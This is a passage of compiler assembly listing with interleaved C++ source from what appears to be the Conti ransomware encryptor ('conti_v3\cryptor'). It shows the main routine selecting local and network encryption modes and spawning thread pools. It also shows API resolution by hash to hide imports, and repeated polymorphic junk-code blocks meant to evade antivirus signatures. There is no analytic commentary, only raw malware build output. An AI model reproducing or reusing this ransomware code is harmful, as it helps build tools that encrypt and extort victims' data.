; 49   : 		_morph_var += (int)a + 2;

  003b6	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$27[rbp-169]
  003b9	83 c1 02	 add	 ecx, 2
  003bc	03 ce		 add	 ecx, esi
  003be	89 4d 87	 mov	 DWORD PTR _morph_var$27[rbp-169], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  003c1	8b 45 87	 mov	 eax, DWORD PTR _morph_var$27[rbp-169]
  003c4	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  003c9	7d 07		 jge	 SHORT $LN1213@WinMain
  003cb	ff c8		 dec	 eax
  003cd	83 c8 fc	 or	 eax, -4
  003d0	ff c0		 inc	 eax
$LN1213@WinMain:
  003d2	85 c0		 test	 eax, eax
  003d4	75 7a		 jne	 SHORT $LN744@WinMain
  003d6	66 66 0f 1f 84
	00 00 00 00 00	 npad	 10
$LL737@WinMain:
  003e0	8b 45 87	 mov	 eax, DWORD PTR _morph_var$27[rbp-169]
  003e3	ff c0		 inc	 eax
  003e5	89 45 87	 mov	 DWORD PTR _morph_var$27[rbp-169], eax
  003e8	8b 45 87	 mov	 eax, DWORD PTR _morph_var$27[rbp-169]
  003eb	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  003f0	7d 07		 jge	 SHORT $LN1212@WinMain
  003f2	ff c8		 dec	 eax
  003f4	83 c8 fc	 or	 eax, -4
  003f7	ff c0		 inc	 eax
$LN1212@WinMain:
  003f9	85 c0		 test	 eax, eax
  003fb	74 e3		 je	 SHORT $LL737@WinMain

; 51   : 	}

  003fd	eb 51		 jmp	 SHORT $LN744@WinMain
$LN745@WinMain:

; 52   : 	else if (_morph_var % 2) {

  003ff	8b 45 87	 mov	 eax, DWORD PTR _morph_var$27[rbp-169]

; 53   : 		_morph_var -= (int)a - 2;

  00402	b9 02 00 00 00	 mov	 ecx, 2
  00407	8b 45 87	 mov	 eax, DWORD PTR _morph_var$27[rbp-169]
  0040a	2b ce		 sub	 ecx, esi
  0040c	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  0040e	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00413	89 4d 87	 mov	 DWORD PTR _morph_var$27[rbp-169], ecx
  00416	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$27[rbp-169]
  00419	f7 e9		 imul	 ecx
  0041b	8b c2		 mov	 eax, edx
  0041d	c1 e8 1f	 shr	 eax, 31
  00420	03 d0		 add	 edx, eax
  00422	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00425	3b c8		 cmp	 ecx, eax
  00427	75 27		 jne	 SHORT $LN744@WinMain
  00429	0f 1f 80 00 00
	00 00		 npad	 7
$LL739@WinMain:
  00430	8b 45 87	 mov	 eax, DWORD PTR _morph_var$27[rbp-169]
  00433	ff c0		 inc	 eax
  00435	89 45 87	 mov	 DWORD PTR _morph_var$27[rbp-169], eax
  00438	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0043d	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$27[rbp-169]
  00440	f7 e9		 imul	 ecx
  00442	8b c2		 mov	 eax, edx
  00444	c1 e8 1f	 shr	 eax, 31
  00447	03 d0		 add	 edx, eax
  00449	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0044c	3b c8		 cmp	 ecx, eax
  0044e	74 e0		 je	 SHORT $LL739@WinMain
$LN744@WinMain:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 266  : 	if (global::GetEncryptMode() == ALL_ENCRYPT || global::GetEncryptMode() == LOCAL_ENCRYPT) {

  00450	8b 05 00 00 00
	00		 mov	 eax, DWORD PTR ?g_EncryptMode@@3HA ; g_EncryptMode
  00456	83 c0 f6	 add	 eax, -10		; fffffff6H
  00459	83 f8 01	 cmp	 eax, 1
  0045c	0f 87 4e 02 00
	00		 ja	 $LN1217@WinMain
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 423  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xddde40d3, 73);//GetProcAddress(hKernel32, OBFA("InitializeCriticalSection"));

  00462	ba 0f 00 00 00	 mov	 edx, 15
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 134  : 	TAILQ_INIT(&ThreadPoolInfo->TaskList);

  00467	4c 89 3d 40 00
	00 00		 mov	 QWORD PTR ?g_LocalThreadPool@@3Uthreadpool_info@@A+64, r15
  0046e	48 8d 05 40 00
	00 00		 lea	 rax, OFFSET FLAT:?g_LocalThreadPool@@3Uthreadpool_info@@A+64

; 135  : 	ThreadPoolInfo->ThreadsCount = ThreadsCount;

  00475	4c 89 35 08 00
	00 00		 mov	 QWORD PTR ?g_LocalThreadPool@@3Uthreadpool_info@@A+8, r14
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 423  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xddde40d3, 73);//GetProcAddress(hKernel32, OBFA("InitializeCriticalSection"));

  0047c	41 b8 d3 40 de
	dd		 mov	 r8d, -572636973		; ddde40d3H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 134  : 	TAILQ_INIT(&ThreadPoolInfo->TaskList);

  00482	48 89 05 48 00
	00 00		 mov	 QWORD PTR ?g_LocalThreadPool@@3Uthreadpool_info@@A+72, rax

; 136  : 	ThreadPoolInfo->IsActive = FALSE;

  00489	44 89 3d 10 00
	00 00		 mov	 DWORD PTR ?g_LocalThreadPool@@3Uthreadpool_info@@A+16, r15d
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 423  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xddde40d3, 73);//GetProcAddress(hKernel32, OBFA("InitializeCriticalSection"));

  00490	44 8d 4a 3a	 lea	 r9d, QWORD PTR [rdx+58]
  00494	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 424  : 	return pFunction(lpCriticalSection);

  00499	48 8d 0d 18 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_LocalThreadPool@@3Uthreadpool_info@@A+24
  004a0	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 138  : 	ThreadPoolInfo->hThreads = (PHANDLE)m_malloc(sizeof(HANDLE) * ThreadsCount);

  004a2	4a 8d 1c f5 00
	00 00 00	 lea	 rbx, QWORD PTR [r14*8]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp

; 5    : 	LPVOID mem = malloc(Size);

  004aa	48 8b cb	 mov	 rcx, rbx
  004ad	e8 00 00 00 00	 call	 malloc

; 6    : 	memset(mem, 0, Size);

  004b2	4c 8b c3	 mov	 r8, rbx
  004b5	33 d2		 xor	 edx, edx
  004b7	48 8b c8	 mov	 rcx, rax
  004ba	48 8b f8	 mov	 rdi, rax
  004bd	e8 00 00 00 00	 call	 memset
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 138  : 	ThreadPoolInfo->hThreads = (PHANDLE)m_malloc(sizeof(HANDLE) * ThreadsCount);

  004c2	48 89 3d 00 00
	00 00		 mov	 QWORD PTR ?g_LocalThreadPool@@3Uthreadpool_info@@A, rdi

; 139  : 	if (!ThreadPoolInfo->hThreads) {

  004c9	48 85 ff	 test	 rdi, rdi
  004cc	0f 84 ee 07 00
	00		 je	 $LN1183@WinMain
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  004d2	c7 45 87 c1 9b
	17 00		 mov	 DWORD PTR _morph_var$28[rbp-169], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  004d9	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  004de	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$28[rbp-169]
  004e1	f7 e9		 imul	 ecx
  004e3	8b c2		 mov	 eax, edx
  004e5	c1 e8 1f	 shr	 eax, 31
  004e8	03 d0		 add	 edx, eax
  004ea	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  004ed	3b c8		 cmp	 ecx, eax
  004ef	74 4e		 je	 SHORT $LN805@WinMain

; 49   : 		_morph_var += (int)a + 2;

  004f1	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$28[rbp-169]
  004f4	83 c1 02	 add	 ecx, 2
  004f7	03 ce		 add	 ecx, esi
  004f9	89 4d 87	 mov	 DWORD PTR _morph_var$28[rbp-169], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  004fc	8b 45 87	 mov	 eax, DWORD PTR _morph_var$28[rbp-169]
  004ff	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00504	7d 07		 jge	 SHORT $LN1210@WinMain
  00506	ff c8		 dec	 eax
  00508	83 c8 fc	 or	 eax, -4
  0050b	ff c0		 inc	 eax
$LN1210@WinMain:
  0050d	85 c0		 test	 eax, eax
  0050f	75 7f		 jne	 SHORT $LN804@WinMain
  00511	0f 1f 40 00 66
	66 66 0f 1f 84
	00 00 00 00 00	 npad	 15
$LL797@WinMain:
  00520	8b 45 87	 mov	 eax, DWORD PTR _morph_var$28[rbp-169]
  00523	ff c0		 inc	 eax
  00525	89 45 87	 mov	 DWORD PTR _morph_var$28[rbp-169], eax
  00528	8b 45 87	 mov	 eax, DWORD PTR _morph_var$28[rbp-169]
  0052b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00530	7d 07		 jge	 SHORT $LN1209@WinMain
  00532	ff c8		 dec	 eax
  00534	83 c8 fc	 or	 eax, -4
  00537	ff c0		 inc	 eax
$LN1209@WinMain:
  00539	85 c0		 test	 eax, eax
  0053b	74 e3		 je	 SHORT $LL797@WinMain

; 51   : 	}

  0053d	eb 51		 jmp	 SHORT $LN804@WinMain
$LN805@WinMain:

; 52   : 	else if (_morph_var % 2) {

  0053f	8b 45 87	 mov	 eax, DWORD PTR _morph_var$28[rbp-169]

; 53   : 		_morph_var -= (int)a - 2;

  00542	b9 02 00 00 00	 mov	 ecx, 2
  00547	8b 45 87	 mov	 eax, DWORD PTR _morph_var$28[rbp-169]
  0054a	2b ce		 sub	 ecx, esi
  0054c	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  0054e	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00553	89 4d 87	 mov	 DWORD PTR _morph_var$28[rbp-169], ecx
  00556	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$28[rbp-169]
  00559	f7 e9		 imul	 ecx
  0055b	8b c2		 mov	 eax, edx
  0055d	c1 e8 1f	 shr	 eax, 31
  00560	03 d0		 add	 edx, eax
  00562	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00565	3b c8		 cmp	 ecx, eax
  00567	75 27		 jne	 SHORT $LN804@WinMain
  00569	0f 1f 80 00 00
	00 00		 npad	 7
$LL799@WinMain:
  00570	8b 45 87	 mov	 eax, DWORD PTR _morph_var$28[rbp-169]
  00573	ff c0		 inc	 eax
  00575	89 45 87	 mov	 DWORD PTR _morph_var$28[rbp-169], eax
  00578	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0057d	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$28[rbp-169]
  00580	f7 e9		 imul	 ecx
  00582	8b c2		 mov	 eax, edx
  00584	c1 e8 1f	 shr	 eax, 31
  00587	03 d0		 add	 edx, eax
  00589	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0058c	3b c8		 cmp	 ecx, eax
  0058e	74 e0		 je	 SHORT $LL799@WinMain
$LN804@WinMain:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 162  : 	for (SIZE_T i = 0; i < ThreadPoolInfo->ThreadsCount; i++) {

  00590	49 8b df	 mov	 rbx, r15
  00593	c7 05 10 00 00
	00 01 00 00 00	 mov	 DWORD PTR ?g_LocalThreadPool@@3Uthreadpool_info@@A+16, 1
  0059d	48 39 1d 08 00
	00 00		 cmp	 QWORD PTR ?g_LocalThreadPool@@3Uthreadpool_info@@A+8, rbx
  005a4	76 53		 jbe	 SHORT $LN819@WinMain
  005a6	66 66 0f 1f 84
	00 00 00 00 00	 npad	 10
$LL820@WinMain:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 333  : 	pFunction = (HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x8687ce53, 82);//GetProcAddress(hKernel32, OBFA("CreateThread"));

  005b0	ba 0f 00 00 00	 mov	 edx, 15
  005b5	41 b8 53 ce 87
	86		 mov	 r8d, -2037920173	; 8687ce53H
  005bb	44 8d 4a 43	 lea	 r9d, QWORD PTR [rdx+67]
  005bf	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 334  : 	return pFunction(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);

  005c4	4c 8d 0d 00 00
	00 00		 lea	 r9, OFFSET FLAT:?g_LocalThreadPool@@3Uthreadpool_info@@A ; g_LocalThreadPool
  005cb	4c 89 7c 24 28	 mov	 QWORD PTR [rsp+40], r15
  005d0	4c 8d 05 00 00
	00 00		 lea	 r8, OFFSET FLAT:?ThreadpoolHandler@@YAKPEAUthreadpool_info@@@Z ; ThreadpoolHandler
  005d7	44 89 7c 24 20	 mov	 DWORD PTR [rsp+32], r15d
  005dc	33 d2		 xor	 edx, edx
  005de	33 c9		 xor	 ecx, ecx
  005e0	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 163  : 		ThreadPoolInfo->hThreads[i] = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&ThreadpoolHandler, ThreadPoolInfo, 0, NULL);

  005e2	48 8b 0d 00 00
	00 00		 mov	 rcx, QWORD PTR ?g_LocalThreadPool@@3Uthreadpool_info@@A
  005e9	48 89 04 d9	 mov	 QWORD PTR [rcx+rbx*8], rax
  005ed	48 ff c3	 inc	 rbx
  005f0	48 3b 1d 08 00
	00 00		 cmp	 rbx, QWORD PTR ?g_LocalThreadPool@@3Uthreadpool_info@@A+8
  005f7	72 b7		 jb	 SHORT $LL820@WinMain
$LN819@WinMain:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  005f9	c7 45 87 c1 9b
	17 00		 mov	 DWORD PTR _morph_var$23[rbp-169], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  00600	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00605	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$23[rbp-169]
  00608	f7 e9		 imul	 ecx
  0060a	8b c2		 mov	 eax, edx
  0060c	c1 e8 1f	 shr	 eax, 31
  0060f	03 d0		 add	 edx, eax
  00611	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00614	3b c8		 cmp	 ecx, eax
  00616	74 47		 je	 SHORT $LN920@WinMain

; 49   : 		_morph_var += (int)a + 2;

  00618	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$23[rbp-169]
  0061b	83 c1 02	 add	 ecx, 2
  0061e	03 ce		 add	 ecx, esi
  00620	89 4d 87	 mov	 DWORD PTR _morph_var$23[rbp-169], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00623	8b 45 87	 mov	 eax, DWORD PTR _morph_var$23[rbp-169]
  00626	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  0062b	7d 07		 jge	 SHORT $LN1207@WinMain
  0062d	ff c8		 dec	 eax
  0062f	83 c8 fc	 or	 eax, -4
  00632	ff c0		 inc	 eax
$LN1207@WinMain:
  00634	85 c0		 test	 eax, eax
  00636	75 78		 jne	 SHORT $LN1217@WinMain
  00638	0f 1f 84 00 00
	00 00 00	 npad	 8
$LL912@WinMain:
  00640	8b 45 87	 mov	 eax, DWORD PTR _morph_var$23[rbp-169]
  00643	ff c0		 inc	 eax
  00645	89 45 87	 mov	 DWORD PTR _morph_var$23[rbp-169], eax
  00648	8b 45 87	 mov	 eax, DWORD PTR _morph_var$23[rbp-169]
  0064b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00650	7d 07		 jge	 SHORT $LN1206@WinMain
  00652	ff c8		 dec	 eax
  00654	83 c8 fc	 or	 eax, -4
  00657	ff c0		 inc	 eax
$LN1206@WinMain:
  00659	85 c0		 test	 eax, eax
  0065b	74 e3		 je	 SHORT $LL912@WinMain

; 51   : 	}

  0065d	eb 51		 jmp	 SHORT $LN1217@WinMain
$LN920@WinMain:

; 52   : 	else if (_morph_var % 2) {

  0065f	8b 45 87	 mov	 eax, DWORD PTR _morph_var$23[rbp-169]

; 53   : 		_morph_var -= (int)a - 2;

  00662	b9 02 00 00 00	 mov	 ecx, 2
  00667	8b 45 87	 mov	 eax, DWORD PTR _morph_var$23[rbp-169]
  0066a	2b ce		 sub	 ecx, esi
  0066c	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  0066e	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00673	89 4d 87	 mov	 DWORD PTR _morph_var$23[rbp-169], ecx
  00676	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$23[rbp-169]
  00679	f7 e9		 imul	 ecx
  0067b	8b c2		 mov	 eax, edx
  0067d	c1 e8 1f	 shr	 eax, 31
  00680	03 d0		 add	 edx, eax
  00682	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00685	3b c8		 cmp	 ecx, eax
  00687	75 27		 jne	 SHORT $LN1217@WinMain
  00689	0f 1f 80 00 00
	00 00		 npad	 7
$LL914@WinMain:
  00690	8b 45 87	 mov	 eax, DWORD PTR _morph_var$23[rbp-169]
  00693	ff c0		 inc	 eax
  00695	89 45 87	 mov	 DWORD PTR _morph_var$23[rbp-169], eax
  00698	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0069d	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$23[rbp-169]
  006a0	f7 e9		 imul	 ecx
  006a2	8b c2		 mov	 eax, edx
  006a4	c1 e8 1f	 shr	 eax, 31
  006a7	03 d0		 add	 edx, eax
  006a9	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  006ac	3b c8		 cmp	 ecx, eax
  006ae	74 e0		 je	 SHORT $LL914@WinMain
$LN1217@WinMain:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 282  : 	if (global::GetEncryptMode() == ALL_ENCRYPT || global::GetEncryptMode() == NETWORK_ENCRYPT) {

  006b0	8b 05 00 00 00
	00		 mov	 eax, DWORD PTR ?g_EncryptMode@@3HA ; g_EncryptMode
  006b6	83 c0 f6	 add	 eax, -10		; fffffff6H
  006b9	a9 fd ff ff ff	 test	 eax, -3			; fffffffdH
  006be	0f 85 4c 02 00
	00		 jne	 $LN7@WinMain
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 423  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xddde40d3, 73);//GetProcAddress(hKernel32, OBFA("InitializeCriticalSection"));

  006c4	ba 0f 00 00 00	 mov	 edx, 15
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 134  : 	TAILQ_INIT(&ThreadPoolInfo->TaskList);

  006c9	4c 89 3d 40 00
	00 00		 mov	 QWORD PTR ?g_NetworkThreadPool@@3Uthreadpool_info@@A+64, r15
  006d0	48 8d 05 40 00
	00 00		 lea	 rax, OFFSET FLAT:?g_NetworkThreadPool@@3Uthreadpool_info@@A+64

; 135  : 	ThreadPoolInfo->ThreadsCount = ThreadsCount;

  006d7	4c 89 35 08 00
	00 00		 mov	 QWORD PTR ?g_NetworkThreadPool@@3Uthreadpool_info@@A+8, r14
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 423  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xddde40d3, 73);//GetProcAddress(hKernel32, OBFA("InitializeCriticalSection"));

  006de	41 b8 d3 40 de
	dd		 mov	 r8d, -572636973		; ddde40d3H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 134  : 	TAILQ_INIT(&ThreadPoolInfo->TaskList);

  006e4	48 89 05 48 00
	00 00		 mov	 QWORD PTR ?g_NetworkThreadPool@@3Uthreadpool_info@@A+72, rax

; 136  : 	ThreadPoolInfo->IsActive = FALSE;

  006eb	44 89 3d 10 00
	00 00		 mov	 DWORD PTR ?g_NetworkThreadPool@@3Uthreadpool_info@@A+16, r15d
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 423  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xddde40d3, 73);//GetProcAddress(hKernel32, OBFA("InitializeCriticalSection"));

  006f2	44 8d 4a 3a	 lea	 r9d, QWORD PTR [rdx+58]
  006f6	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 424  : 	return pFunction(lpCriticalSection);

  006fb	48 8d 0d 18 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_NetworkThreadPool@@3Uthreadpool_info@@A+24
  00702	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 138  : 	ThreadPoolInfo->hThreads = (PHANDLE)m_malloc(sizeof(HANDLE) * ThreadsCount);

  00704	4a 8d 1c f5 00
	00 00 00	 lea	 rbx, QWORD PTR [r14*8]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp

; 5    : 	LPVOID mem = malloc(Size);

  0070c	48 8b cb	 mov	 rcx, rbx
  0070f	e8 00 00 00 00	 call	 malloc

; 6    : 	memset(mem, 0, Size);

  00714	4c 8b c3	 mov	 r8, rbx
  00717	33 d2		 xor	 edx, edx
  00719	48 8b c8	 mov	 rcx, rax
  0071c	48 8b f8	 mov	 rdi, rax
  0071f	e8 00 00 00 00	 call	 memset
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 138  : 	ThreadPoolInfo->hThreads = (PHANDLE)m_malloc(sizeof(HANDLE) * ThreadsCount);

  00724	48 89 3d 00 00
	00 00		 mov	 QWORD PTR ?g_NetworkThreadPool@@3Uthreadpool_info@@A, rdi

; 139  : 	if (!ThreadPoolInfo->hThreads) {

  0072b	48 85 ff	 test	 rdi, rdi
  0072e	0f 84 8c 05 00
	00		 je	 $LN1183@WinMain
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00734	c7 45 87 c1 9b
	17 00		 mov	 DWORD PTR _morph_var$22[rbp-169], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  0073b	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00740	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$22[rbp-169]
  00743	f7 e9		 imul	 ecx
  00745	8b c2		 mov	 eax, edx
  00747	c1 e8 1f	 shr	 eax, 31
  0074a	03 d0		 add	 edx, eax
  0074c	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0074f	3b c8		 cmp	 ecx, eax
  00751	74 4c		 je	 SHORT $LN941@WinMain

; 49   : 		_morph_var += (int)a + 2;

  00753	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$22[rbp-169]
  00756	83 c1 02	 add	 ecx, 2
  00759	03 ce		 add	 ecx, esi
  0075b	89 4d 87	 mov	 DWORD PTR _morph_var$22[rbp-169], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  0075e	8b 45 87	 mov	 eax, DWORD PTR _morph_var$22[rbp-169]
  00761	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00766	7d 07		 jge	 SHORT $LN1204@WinMain
  00768	ff c8		 dec	 eax
  0076a	83 c8 fc	 or	 eax, -4
  0076d	ff c0		 inc	 eax
$LN1204@WinMain:
  0076f	85 c0		 test	 eax, eax
  00771	75 7d		 jne	 SHORT $LN940@WinMain
  00773	0f 1f 40 00 66
	0f 1f 84 00 00
	00 00 00	 npad	 13
$LL933@WinMain:
  00780	8b 45 87	 mov	 eax, DWORD PTR _morph_var$22[rbp-169]
  00783	ff c0		 inc	 eax
  00785	89 45 87	 mov	 DWORD PTR _morph_var$22[rbp-169], eax
  00788	8b 45 87	 mov	 eax, DWORD PTR _morph_var$22[rbp-169]
  0078b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00790	7d 07		 jge	 SHORT $LN1203@WinMain
  00792	ff c8		 dec	 eax
  00794	83 c8 fc	 or	 eax, -4
  00797	ff c0		 inc	 eax
$LN1203@WinMain:
  00799	85 c0		 test	 eax, eax
  0079b	74 e3		 je	 SHORT $LL933@WinMain

; 51   : 	}

  0079d	eb 51		 jmp	 SHORT $LN940@WinMain
$LN941@WinMain:

; 52   : 	else if (_morph_var % 2) {

  0079f	8b 45 87	 mov	 eax, DWORD PTR _morph_var$22[rbp-169]

; 53   : 		_morph_var -= (int)a - 2;

  007a2	b9 02 00 00 00	 mov	 ecx, 2
  007a7	8b 45 87	 mov	 eax, DWORD PTR _morph_var$22[rbp-169]
  007aa	2b ce		 sub	 ecx, esi
  007ac	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  007ae	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  007b3	89 4d 87	 mov	 DWORD PTR _morph_var$22[rbp-169], ecx
  007b6	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$22[rbp-169]
  007b9	f7 e9		 imul	 ecx
  007bb	8b c2		 mov	 eax, edx
  007bd	c1 e8 1f	 shr	 eax, 31
  007c0	03 d0		 add	 edx, eax
  007c2	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  007c5	3b c8		 cmp	 ecx, eax
  007c7	75 27		 jne	 SHORT $LN940@WinMain
  007c9	0f 1f 80 00 00
	00 00		 npad	 7
$LL935@WinMain:
  007d0	8b 45 87	 mov	 eax, DWORD PTR _morph_var$22[rbp-169]
  007d3	ff c0		 inc	 eax
  007d5	89 45 87	 mov	 DWORD PTR _morph_var$22[rbp-169], eax
  007d8	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  007dd	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$22[rbp-169]
  007e0	f7 e9		 imul	 ecx
  007e2	8b c2		 mov	 eax, edx
  007e4	c1 e8 1f	 shr	 eax, 31
  007e7	03 d0		 add	 edx, eax
  007e9	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  007ec	3b c8		 cmp	 ecx, eax
  007ee	74 e0		 je	 SHORT $LL935@WinMain
$LN940@WinMain:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 162  : 	for (SIZE_T i = 0; i < ThreadPoolInfo->ThreadsCount; i++) {

  007f0	49 8b df	 mov	 rbx, r15
  007f3	c7 05 10 00 00
	00 01 00 00 00	 mov	 DWORD PTR ?g_NetworkThreadPool@@3Uthreadpool_info@@A+16, 1
  007fd	48 39 1d 08 00
	00 00		 cmp	 QWORD PTR ?g_NetworkThreadPool@@3Uthreadpool_info@@A+8, rbx
  00804	76 53		 jbe	 SHORT $LN955@WinMain
  00806	66 66 0f 1f 84
	00 00 00 00 00	 npad	 10
$LL956@WinMain:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 333  : 	pFunction = (HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x8687ce53, 82);//GetProcAddress(hKernel32, OBFA("CreateThread"));

  00810	ba 0f 00 00 00	 mov	 edx, 15
  00815	41 b8 53 ce 87
	86		 mov	 r8d, -2037920173	; 8687ce53H
  0081b	44 8d 4a 43	 lea	 r9d, QWORD PTR [rdx+67]
  0081f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 334  : 	return pFunction(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);

  00824	4c 8d 0d 00 00
